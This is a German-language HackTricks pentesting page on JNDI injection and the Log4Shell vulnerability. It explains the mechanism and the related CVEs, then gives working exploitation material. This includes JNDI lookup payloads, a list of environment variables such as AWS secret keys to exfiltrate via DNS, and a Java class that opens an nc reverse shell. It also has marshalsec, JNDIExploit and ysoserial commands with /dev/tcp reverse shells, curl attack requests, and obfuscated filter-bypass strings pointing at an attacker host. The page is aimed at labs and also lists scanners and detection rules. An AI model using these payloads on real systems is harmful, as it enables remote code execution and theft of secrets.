# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Sicherheitsl√ºcken, damit Sie sie schneller beheben k√∂nnen. Intruder verfolgt Ihre Angriffsfl√§che, f√ºhrt proaktive Bedrohungsscans durch, findet Probleme in Ihrer gesamten Technologie-Stack, von APIs √ºber Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Grundlegende Informationen

JNDI, seit Ende der 1990er Jahre in Java integriert, dient als Verzeichnisdienst und erm√∂glicht es Java-Programmen, Daten oder Objekte √ºber ein Namenssystem zu lokalisieren. Es unterst√ºtzt verschiedene Verzeichnisdienste √ºber Service Provider Interfaces (SPIs), die den Abruf von Daten aus verschiedenen Systemen erm√∂glichen, einschlie√ülich entfernten Java-Objekten. Zu den g√§ngigen SPIs geh√∂ren CORBA COS, Java RMI Registry und LDAP.

### JNDI-Namensreferenz
Java-Objekte k√∂nnen mithilfe von JNDI-Namensreferenzen gespeichert und abgerufen werden, die in zwei Formen vorliegen:

- **Referenzadressen**: Gibt den Speicherort eines Objekts an (z. B. _rmi://server/ref_), was den direkten Abruf von der angegebenen Adresse erm√∂glicht.
- **Remote Factory**: Verweist auf eine Remote Factory-Klasse. Beim Zugriff wird die Klasse von der Remote-Position heruntergeladen und instanziiert.

Dieser Mechanismus kann jedoch ausgenutzt werden, was potenziell zum Laden und Ausf√ºhren beliebigen Codes f√ºhren kann. Als Gegenma√ünahme:

- **RMI**: `java.rmi.server.useCodeabseOnly = true` standardm√§√üig ab JDK 7u21, was das Laden von Remote-Objekten einschr√§nkt. Ein Security Manager begrenzt zus√§tzlich, was geladen werden kann.
- **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` standardm√§√üig ab JDK 6u141, 7u131, 8u121, was die Ausf√ºhrung von remote geladenen Java-Objekten blockiert. Wenn auf `true` gesetzt, ist eine Remote-Codeausf√ºhrung ohne Aufsicht eines Security Managers m√∂glich.
- **CORBA**: Hat keine spezifische Eigenschaft, aber der Security Manager ist immer aktiv.

Der **Naming Manager**, der f√ºr die Aufl√∂sung von JNDI-Links verantwortlich ist, verf√ºgt jedoch nicht √ºber integrierte Sicherheitsmechanismen, was potenziell das Abrufen von Objekten aus beliebigen Quellen erm√∂glicht. Dies birgt ein Risiko, da RMI-, LDAP- und CORBA-Schutzma√ünahmen umgangen werden k√∂nnen, was zum Laden beliebiger Java-Objekte oder zur Ausnutzung vorhandener Anwendungskomponenten (Gadgets) zur Ausf√ºhrung von b√∂sartigem Code f√ºhren kann.

Beispiele f√ºr angreifbare URLs sind:
- _rmi://angreifer-server/bar_
- _ldap://angreifer-server/bar_
- _iiop://angreifer-server/bar_

Trotz der Schutzma√ünahmen bestehen weiterhin Sicherheitsl√ºcken, haupts√§chlich aufgrund des Mangels an Schutzma√ünahmen gegen das Laden von JNDI aus nicht vertrauensw√ºrdigen Quellen und der M√∂glichkeit, bestehende Schutzma√ünahmen zu umgehen.


### JNDI-Beispiel

![](<../../.gitbook/assets/image (655) (1) (1).png>)

Selbst wenn Sie eine **`PROVIDER_URL`** festgelegt haben, k√∂nnen Sie in einem Lookup eine andere angeben und darauf zugreifen: `ctx.lookup("<vom Angreifer kontrollierte URL>")` und das ist es, was ein Angreifer ausnutzen wird, um beliebige Objekte von einem von ihm kontrollierten System zu laden.

### CORBA-√úbersicht

CORBA (Common Object Request Broker Architecture) verwendet eine **Interoperable Object Reference (IOR)**, um entfernte Objekte eindeutig zu identifizieren. Diese Referenz enth√§lt wichtige Informationen wie:

- **Type ID**: Eindeutiger Bezeichner f√ºr eine Schnittstelle.
- **Codebase**: URL zum Abrufen der Stub-Klasse.

CORBA ist grunds√§tzlich nicht anf√§llig. Die Sicherheit wird in der Regel durch folgende Ma√ünahmen gew√§hrleistet:

- Installation eines **Security Managers**.
- Konfiguration des Security Managers, um Verbindungen zu potenziell b√∂sartigen Codebases zu erm√∂glichen. Dies kann durchgef√ºhrt werden durch:
- Socket-Berechtigung, z. B. ````permissions java.net.SocketPermission "*:1098-1099", "connect";````.
- Dateileseberechtigungen, entweder universell (````permission java.io.FilePermission "<<ALL FILES>>", "read";````) oder f√ºr bestimmte Verzeichnisse, in denen b√∂sartige Dateien platziert werden k√∂nnten.

Einige Anbierrichtlinien k√∂nnen jedoch nachsichtig sein und diese Verbindungen standardm√§√üig zulassen.

### RMI-Kontext

Bei RMI (Remote Method Invocation) ist die Situation etwas anders. Wie bei CORBA ist das Herunterladen beliebiger Klassen standardm√§√üig eingeschr√§nkt. Um RMI auszunutzen, m√ºsste man in der Regel den Security Manager umgehen, was auch bei CORBA relevant ist.

### LDAP

Zun√§chst m√ºssen wir zwischen einer Suche und einem Lookup unterscheiden.\
Eine **Suche** verwendet eine URL wie `ldap://localhost:389/o=JNDITutorial`, um das JNDITutorial-Objekt von einem LDAP-Server zu finden und seine Attribute abzurufen.\
Ein **Lookup** ist f√ºr **Namensdienste** gedacht, da wir das **an einen Namen gebundene Objekt** erhalten m√∂chten.

Wenn die LDAP-Suche mit **SearchControls.setReturningObjFlag() mit `true` aufgerufen wurde, wird das zur√ºckgegebene Objekt rekonstruiert**.

Daher gibt es mehrere M√∂glichkeiten, diese Optionen anzugreifen.\
Ein **Angreifer kann LDAP-Eintr√§ge vergiften und Payloads einf√ºhren**, die in den Systemen, die sie sammeln, ausgef√ºhrt werden (sehr n√ºtzlich, um Dutzende von Maschinen zu kompromittieren, wenn Sie Zugriff auf den LDAP-Server haben). Eine andere M√∂glichkeit, dies auszunutzen, besteht darin, einen **MitM-Angriff in einer LDAP-Suche** durchzuf√ºhren, zum Beispiel.

Wenn Sie eine App dazu bringen k√∂nnen, eine **JNDI LDAP-URL aufzul√∂sen**, k√∂nnen Sie das LDAP steuern, das durchsucht wird, und Sie k√∂nnten den Exploit (log4shell) zur√ºckschicken.

#### Deserialisierungs-Exploit

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

Der **Exploit wird serialisiert** und dann deserialisiert.\
Wenn `trustURLCodebase` `true` ist, kann ein Angreifer seine eigenen Klassen in der Codebase bereitstellen. Andernfalls m√ºsste er Gadgets im Klassenpfad missbrauchen.

#### JNDI-Referenz-Exploit

Es ist einfacher, dieses LDAP mit **JavaFactory-Referenzen** anzugreifen:

![](<../../.gitbook/assets/image (660) (1) (1).png>)
## Log4Shell-Schwachstelle

Die Schwachstelle tritt in Log4j auf, da es eine [**spezielle Syntax**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) in Form von `${prefix:name}` unterst√ºtzt, wobei `prefix` eine der verschiedenen [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) ist, bei denen `name` ausgewertet werden sollte. Zum Beispiel ist `${java:version}` die aktuelle Version von Java.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) f√ºhrte eine `jndi`-Lookup-Funktion ein. Diese Funktion erm√∂glicht das Abrufen von Variablen √ºber JNDI. Normalerweise wird der Schl√ºssel automatisch mit `java:comp/env/` vorangestellt. Wenn der Schl√ºssel jedoch selbst ein **":"** enth√§lt, wird dieser Standardpr√§fix nicht angewendet.

Mit einem **: im Schl√ºssel**, wie z.B. `${jndi:ldap://example.com/a}`, gibt es **keinen Pr√§fix** und der **LDAP-Server wird nach dem Objekt abgefragt**. Diese Lookups k√∂nnen sowohl in der Konfiguration von Log4j als auch beim Protokollieren von Zeilen verwendet werden.

Daher ist das Einzige, was ben√∂tigt wird, um RCE zu erhalten, eine **verwundbare Version von Log4j, die vom Benutzer kontrollierte Informationen verarbeitet**. Da dies eine von Java-Anwendungen weit verbreitete Bibliothek ist, um Informationen zu protokollieren (auch von Internetanwendungen), war es sehr h√§ufig, dass log4j beispielsweise HTTP-Header wie den User-Agent protokolliert hat. Log4j wird jedoch **nicht nur zur Protokollierung von HTTP-Informationen, sondern f√ºr jede Eingabe** und Daten verwendet, die der Entwickler angegeben hat.

## √úbersicht √ºber Log4Shell-bezogene CVEs

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **[Kritisch]**
Diese Schwachstelle ist ein kritischer **unvertrauensw√ºrdiger Deserialisierungsfehler** in der Komponente `log4j-core`, der Versionen von 2.0-beta9 bis 2.14.1 betrifft. Sie erm√∂glicht **Remote Code Execution (RCE)** und erm√∂glicht es Angreifern, Systeme zu √ºbernehmen. Das Problem wurde von Chen Zhaojun vom Alibaba Cloud Security Team gemeldet und betrifft verschiedene Apache-Frameworks. Die anf√§ngliche Korrektur in Version 2.15.0 war unvollst√§ndig. Sigma-Regeln zur Verteidigung sind verf√ºgbar ([Regel 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j_fields.yml), [Regel 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **[Kritisch]**
Urspr√ºnglich als gering eingestuft, sp√§ter jedoch auf kritisch hochgestuft, handelt es sich bei dieser CVE um einen **Denial-of-Service (DoS)**-Fehler, der auf einer unvollst√§ndigen Korrektur in Version 2.15.0 f√ºr CVE-2021-44228 beruht. Er betrifft nicht standardm√§√üige Konfigurationen und erm√∂glicht es Angreifern, DoS-Angriffe durch manipulierte Payloads durchzuf√ºhren. Ein [Tweet](https://twitter.com/marcioalm/status/1471740771581652995) zeigt eine Umgehungsmethode. Das Problem wird in den Versionen 2.16.0 und 2.12.2 durch Entfernen von Nachrichten-Suchmustern und Deaktivieren von JNDI standardm√§√üig behoben.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **[Hoch]**
Diese CVE betrifft **Log4j 1.x-Versionen** in nicht standardm√§√üigen Konfigurationen, die `JMSAppender` verwenden. Es handelt sich um einen unvertrauensw√ºrdigen Deserialisierungsfehler. F√ºr den 1.x-Zweig, der das Ende des Lebens erreicht hat, steht keine Korrektur zur Verf√ºgung, und ein Upgrade auf `log4j-core 2.17.0` wird empfohlen.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **[M√§√üig]**
Diese Schwachstelle betrifft das **Logback-Protokollierungsframework**, einen Nachfolger von Log4j 1.x. Zuvor galt das Framework als sicher, wurde jedoch als verwundbar eingestuft, und neuere Versionen (1.3.0-alpha11 und 1.2.9) wurden ver√∂ffentlicht, um das Problem zu beheben.

### **CVE-2021-45105** **[Hoch]**
Log4j 2.16.0 enth√§lt einen DoS-Fehler, der die Ver√∂ffentlichung von `log4j 2.17.0` zur Behebung der CVE erforderlich macht. Weitere Details finden Sie in dem Bericht von BleepingComputer [hier](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/).

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)
Diese CVE betrifft die Version 2.17 von log4j und erfordert, dass der Angreifer die Konfigurationsdatei von log4j kontrolliert. Es handelt sich um eine potenzielle willk√ºrliche Codeausf√ºhrung √ºber einen konfigurierten JDBCAppender. Weitere Details finden Sie im [Checkmarx-Blogbeitrag](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).


## Ausnutzung von Log4Shell

### Entdeckung

Diese Schwachstelle ist sehr einfach zu entdecken, wenn sie ungesch√ºtzt ist, da sie mindestens eine **DNS-Anfrage** an die von Ihnen in Ihrem Payload angegebene Adresse sendet. Daher sind Payloads wie:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (mit [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (mit [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (mit Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (mit [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (mit [huntress](https://log4shell.huntress.com))

Beachten Sie, dass **auch wenn eine DNS-Anfrage empfangen wird, das nicht bedeutet, dass die Anwendung angreifbar** (oder sogar verwundbar) ist. Sie m√ºssen versuchen, sie auszunutzen.

{% hint style="info" %}
Denken Sie daran, dass Sie zur **Ausnutzung von Version 2.15** die **Bypass-√úberpr√ºfung f√ºr localhost** hinzuf√ºgen m√ºssen: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **Lokale Entdeckung**

Suchen Sie nach **lokalen verwundbaren Versionen** der Bibliothek mit:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Verifikation**

Einige der zuvor aufgelisteten Plattformen erm√∂glichen es Ihnen, einige variable Daten einzuf√ºgen, die protokolliert werden, wenn sie angefordert werden.\
Dies kann f√ºr 2 Dinge sehr n√ºtzlich sein:

* Die **Verifizierung** der Schwachstelle
* Das **Exfiltrieren von Informationen** durch Ausnutzung der Schwachstelle

Sie k√∂nnten beispielsweise etwas wie folgt anfordern:\
oder wie `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** und wenn eine **DNS-Anfrage mit dem Wert der Umgebungsvariable** empfangen wird, wissen Sie, dass die Anwendung anf√§llig ist.

Andere Informationen, die Sie versuchen k√∂nnten, **auszulecken**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE-Information

{% hint style="info" %}
Hosts, die auf JDK-Versionen √ºber 6u141, 7u131 oder 8u121 laufen, sind gegen den LDAP-Klassenladungs-Angriffsvektor gesch√ºtzt. Dies liegt an der standardm√§√üigen Deaktivierung von `com.sun.jndi.ldap.object.trustURLCodebase`, die verhindert, dass JNDI einen Remote-Codebase √ºber LDAP l√§dt. Es ist jedoch wichtig zu beachten, dass diese Versionen **nicht gegen den Deserialisierungs-Angriffsvektor gesch√ºtzt sind**.

F√ºr Angreifer, die diese h√∂heren JDK-Versionen ausnutzen m√∂chten, ist es notwendig, einen **vertrauensw√ºrdigen Gadget** innerhalb der Java-Anwendung zu nutzen. Tools wie ysoserial oder JNDIExploit werden oft zu diesem Zweck verwendet. Im Gegensatz dazu ist das Ausnutzen niedrigerer JDK-Versionen relativ einfacher, da diese Versionen manipuliert werden k√∂nnen, um beliebige Klassen zu laden und auszuf√ºhren.

F√ºr **weitere Informationen** (_wie Einschr√§nkungen bei RMI- und CORBA-Vektoren_) **√ºberpr√ºfen Sie den vorherigen Abschnitt JNDI Naming Reference** oder [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec mit benutzerdefiniertem Payload

Sie k√∂nnen dies auf der **THM-Box** testen: [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

Verwenden Sie das Tool [**marshalsec**](https://github.com/mbechler/marshalsec) (JAR-Version hier verf√ºgbar [**hier**](https://github.com/RandomRobbieBF/marshalsec-jar)). Dieser Ansatz richtet einen LDAP-Referral-Server ein, um Verbindungen auf einen sekund√§ren HTTP-Server umzuleiten, auf dem der Exploit gehostet wird:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Um das Ziel dazu zu bringen, einen Reverse-Shell-Code zu laden, erstellen Sie eine Java-Datei mit dem Namen `Exploit.java` und dem folgenden Inhalt:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Kompilieren Sie die Java-Datei in eine Klassendatei mit dem Befehl: `javac Exploit.java -source 8 -target 8`. Starten Sie anschlie√üend einen **HTTP-Server** im Verzeichnis, das die Klassendatei enth√§lt, mit dem Befehl: `python3 -m http.server`. Stellen Sie sicher, dass der **marshalsec LDAP-Server** auf diesen HTTP-Server verweist.

L√∂sen Sie die Ausf√ºhrung der Exploit-Klasse auf dem anf√§lligen Webserver aus, indem Sie eine Payload versenden, die folgenderma√üen aussieht:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**Hinweis:** Dieser Exploit basiert auf der Konfiguration von Java, die das Laden von Remote-Codebases √ºber LDAP erm√∂glicht. Wenn dies nicht zul√§ssig ist, sollten Sie stattdessen eine vertrauensw√ºrdige Klasse f√ºr die Ausf√ºhrung beliebigen Codes ausnutzen.


### RCE - **JNDIExploit**

{% hint style="info" %}
Beachten Sie, dass der Autor dieses Projekts aus irgendeinem Grund nach der Entdeckung von log4shell von GitHub entfernt wurde. Sie k√∂nnen eine zwischengespeicherte Version unter [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) finden, aber wenn Sie die Entscheidung des Autors respektieren m√∂chten, verwenden Sie eine andere Methode, um diese Schwachstelle auszunutzen.

Au√üerdem k√∂nnen Sie den Quellcode nicht im Wayback Machine finden, daher sollten Sie entweder den Quellcode analysieren oder das JAR-Datei ausf√ºhren, wissend, dass Sie nicht wissen, was Sie ausf√ºhren.
{% endhint %}

F√ºr dieses Beispiel k√∂nnen Sie einfach diesen **verwundbaren Webserver f√ºr log4shell** auf Port 8080 ausf√ºhren: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_in der README finden Sie Informationen zur Ausf√ºhrung_). Diese verwundbare App protokolliert mit einer verwundbaren Version von log4shell den Inhalt des HTTP-Anforderungs-Headers _X-Api-Version_.

Dann k√∂nnen Sie die **JNDIExploit** JAR-Datei herunterladen und mit folgendem Befehl ausf√ºhren:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Nachdem Sie den Code nur wenige Minuten lang gelesen haben, k√∂nnen Sie in _com.feihong.ldap.LdapServer_ und _com.feihong.ldap.HTTPServer_ sehen, wie die **LDAP- und HTTP-Server erstellt werden**. Der LDAP-Server versteht, welches Payload bereitgestellt werden muss, und leitet das Opfer an den HTTP-Server weiter, der den Exploit bereitstellt.\
In _com.feihong.ldap.gadgets_ finden Sie **einige spezifische Gadgets**, die verwendet werden k√∂nnen, um die gew√ºnschte Aktion auszuf√ºhren (potenziell beliebigen Code ausf√ºhren). Und in _com.feihong.ldap.template_ k√∂nnen Sie die verschiedenen Vorlagenklassen sehen, die die Exploits **generieren**.

Sie k√∂nnen alle verf√ºgbaren Exploits mit **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`** anzeigen. Einige n√ºtzliche sind:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
So, in unserem Beispiel haben wir bereits diese anf√§llige Docker-App am Laufen. Um sie anzugreifen:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Bei der Ausf√ºhrung der Angriffe sehen Sie einige Ausgaben im Terminal, in dem Sie **JNDIExploit-1.2-SNAPSHOT.jar** ausgef√ºhrt haben.

**Denken Sie daran, `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` zu √ºberpr√ºfen, um weitere Ausbeutungsoptionen zu erhalten. Au√üerdem k√∂nnen Sie bei Bedarf den Port der LDAP- und HTTP-Server √§ndern.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

Auf √§hnliche Weise wie beim vorherigen Exploit k√∂nnen Sie versuchen, [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) zu verwenden, um diese Schwachstelle auszunutzen.\
Sie k√∂nnen die URLs generieren, die an das Opfer gesendet werden sollen, indem Sie Folgendes ausf√ºhren:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Dieser Angriff mit einem benutzerdefinierten generierten Java-Objekt funktioniert in Laboren wie dem **THM Solar Room**. In der Regel funktioniert dies jedoch nicht (da Java standardm√§√üig nicht so konfiguriert ist, dass Remote-Codebase √ºber LDAP geladen wird), vermutlich weil hierbei keine vertrauensw√ºrdige Klasse missbraucht wird, um beliebigen Code auszuf√ºhren._

### RCE - ysoserial & JNDI-Exploit-Kit

Diese Option ist sehr n√ºtzlich, um **Java-Versionen anzugreifen, die nur bestimmten Klassen vertrauen und nicht jedem**. Daher wird **ysoserial** verwendet, um **Serialisierungen vertrauensw√ºrdiger Klassen** zu generieren, die als Gadgets verwendet werden k√∂nnen, um **beliebigen Code auszuf√ºhren** (_die von ysoserial missbrauchte vertrauensw√ºrdige Klasse muss vom Opfer-Java-Programm verwendet werden, damit der Exploit funktioniert_).

Mit **ysoserial** oder [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) k√∂nnen Sie den Deserialisierungs-Exploit erstellen, der von JNDI heruntergeladen wird:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Verwenden Sie [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit), um **JNDI-Links** zu generieren, an denen der Exploit auf Verbindungen von anf√§lligen Maschinen wartet. Sie k√∂nnen verschiedene Exploits bereitstellen, die automatisch vom JNDI-Exploit-Kit generiert werden, oder sogar Ihre eigenen Deserialisierungspayloads (von Ihnen oder ysoserial) verwenden.
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

Nun k√∂nnen Sie ganz einfach einen generierten JNDI-Link verwenden, um die Schwachstelle auszunutzen und eine **Reverse-Shell** zu erhalten, indem Sie sie an eine verwundbare Version von log4j senden: **`${ldap://10.10.14.10:1389/generated}`**

### Umgehungen
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ƒ±}}:ldap://...} //Notice the unicode "i"
```
### Automatische Scanner

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Finde lokale verwundbare Bibliotheken

### Labore zum Testen

* [**LogForge HTB-Maschine**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar-Raum**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Nach der Log4Shell-Exploitation

In diesem [**CTF-Writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) wird gut erkl√§rt, wie es potenziell m√∂glich ist, einige Funktionen von Log4J zu missbrauchen.

Die [**Sicherheitsseite**](https://logging.apache.org/log4j/2.x/security.html) von Log4j enth√§lt einige interessante S√§tze:

> Ab Version 2.16.0 (f√ºr Java 8) wurde die Funktion zur **Nachrichtenabfrage vollst√§ndig entfernt**. **Abfragen in der Konfiguration funktionieren weiterhin**. Dar√ºber hinaus deaktiviert Log4j standardm√§√üig den Zugriff auf JNDI. JNDI-Abfragen in der Konfiguration m√ºssen nun explizit aktiviert werden.

> Ab Version 2.17.0 (und 2.12.3 und 2.3.1 f√ºr Java 7 und Java 6) werden **nur Zeichenkettenabfragen in der Konfiguration rekursiv erweitert**. In jeder anderen Verwendung wird nur die oberste Abfrage aufgel√∂st und alle verschachtelten Abfragen werden nicht aufgel√∂st.

Das bedeutet, dass du standardm√§√üig **keinen `jndi`-Exploit verwenden kannst**. Au√üerdem m√ºssen rekursive Abfragen konfiguriert sein, um sie durchzuf√ºhren.

Zum Beispiel wurde dies in dem CTF in der Datei log4j2.xml konfiguriert:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Umgebungsvariablen-Suche

In [diesem CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) kontrollierte der Angreifer den Wert von `${sys:cmd}` und musste die Flagge aus einer Umgebungsvariable exfiltrieren.\
